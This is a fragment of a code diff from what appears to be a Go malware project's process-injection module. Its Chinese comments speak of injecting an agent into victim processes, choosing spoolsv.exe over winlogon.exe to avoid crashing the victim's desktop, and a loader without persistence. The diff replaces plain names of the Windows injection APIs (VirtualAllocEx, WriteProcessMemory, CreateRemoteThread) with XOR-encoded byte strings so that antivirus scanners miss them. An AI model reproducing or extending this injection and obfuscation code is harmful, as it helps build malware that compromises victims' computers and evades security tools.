@@ -3,7 +3,7 @@
 
 //进程注入存在问题，执行命令会导致受害者桌面崩溃，貌似是因为agent.exe太大
 //注释掉了winlogon.exe，添加了spoolsv.exe，目前测试不再崩溃
-//存在问题，loader貌似没有实现持久化
+//对敏感字符串（注入目标进程）进行了简单的异或加密处理
 
 package inject
 
@@ -16,12 +16,12 @@ import (
 )
 
 var (
-	kernel32           = syscall.NewLazyDLL("kernel32.dll")
-	ntdll              = syscall.NewLazyDLL("ntdll.dll")
-	VirtualAllocEx     = kernel32.NewProc("VirtualAllocEx")
-	WriteProcessMemory = kernel32.NewProc("WriteProcessMemory")
-	CreateRemoteThread = kernel32.NewProc("CreateRemoteThread")
-	RtlMoveMemory      = ntdll.NewProc("RtlMoveMemory")
+	kernel32           = syscall.NewLazyDLL(xorDecrypt([]byte{0x1c, 0x12, 0x05, 0x19, 0x12, 0x1b, 0x44, 0x45, 0x59, 0x13, 0x1b, 0x1b}))                                   // kernel32.dll
+	ntdll              = syscall.NewLazyDLL(xorDecrypt([]byte{0x19, 0x03, 0x13, 0x1b, 0x1b, 0x59, 0x13, 0x1b, 0x1b}))                                                     // ntdll.dll
+	VirtualAllocEx     = kernel32.NewProc(xorDecrypt([]byte{0x21, 0x1e, 0x05, 0x03, 0x02, 0x16, 0x1b, 0x36, 0x1b, 0x1b, 0x18, 0x14, 0x32, 0x0f}))                         // VirtualAllocEx
+	WriteProcessMemory = kernel32.NewProc(xorDecrypt([]byte{0x20, 0x05, 0x1e, 0x03, 0x12, 0x27, 0x05, 0x18, 0x14, 0x12, 0x04, 0x04, 0x3a, 0x12, 0x1a, 0x18, 0x05, 0x0e})) // WriteProcessMemory
+	CreateRemoteThread = kernel32.NewProc(xorDecrypt([]byte{0x34, 0x05, 0x12, 0x16, 0x03, 0x12, 0x25, 0x12, 0x1a, 0x18, 0x03, 0x12, 0x23, 0x1f, 0x05, 0x12, 0x16, 0x13})) // CreateRemoteThread
+	RtlMoveMemory      = ntdll.NewProc(xorDecrypt([]byte{0x25, 0x03, 0x1b, 0x3a, 0x18, 0x01, 0x12, 0x3a, 0x12, 0x1a, 0x18, 0x05, 0x0e}))                                  // RtlMoveMemory
 )
 
 const (
